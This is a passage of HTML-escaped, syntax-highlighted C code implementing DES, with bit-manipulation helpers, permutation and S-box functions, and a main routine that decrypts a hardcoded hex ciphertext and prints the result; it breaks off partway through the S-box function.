&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HexToBit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TablePermute&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Table,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LoopMove&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Len,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Xor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatA,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatB,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num);

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;S_Change&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;F_Change&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatKi[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]);

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SetKey&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; KeyIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PlayDes&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]);
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KickDes&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]);


&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesHex[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2&amp;#34;&lt;/span&gt;};         &lt;span style=&#34;color:#75715e&#34;&gt;// 16个字符数组用于存放 64位16进制的密文
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MyMessage[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    
    KickDes(MyMessage,MesHex);
    KickDes(MyMessage&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,MesHex&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
    KickDes(MyMessage&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;,MesHex&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
    KickDes(MyMessage&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,MesHex&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;);
    
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Deciphering Over !!:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, MyMessage[i]);
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitsCopy&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Len) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Len; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatIn[i];
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteToBit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;;   
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitToByte&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (Num &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; DatIn[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);    
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BitToHex&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
                    &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;) {
            DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;;
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HexToBit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;) {
            DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;;               
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            DatOut[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((DatIn[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;;
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TablePermute&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatOut,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Table,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Temp[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        Temp[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatIn[Table[i] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    }
    BitsCopy(DatOut, Temp, Num);
} 

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LoopMove&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatIn,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Len,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Temp[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    BitsCopy(Temp,DatIn,Num);
    BitsCopy(DatIn,DatIn&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;Num,Len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Num);
    BitsCopy(DatIn&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;Len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Num,Temp,Num);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Xor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatA,&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;DatB,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Num) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        DatA[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DatA[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; DatB[i];
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;S_Change&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i,X,Y;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, Y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, X &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;, DatIn &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, DatOut &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
        Y&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
        X&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
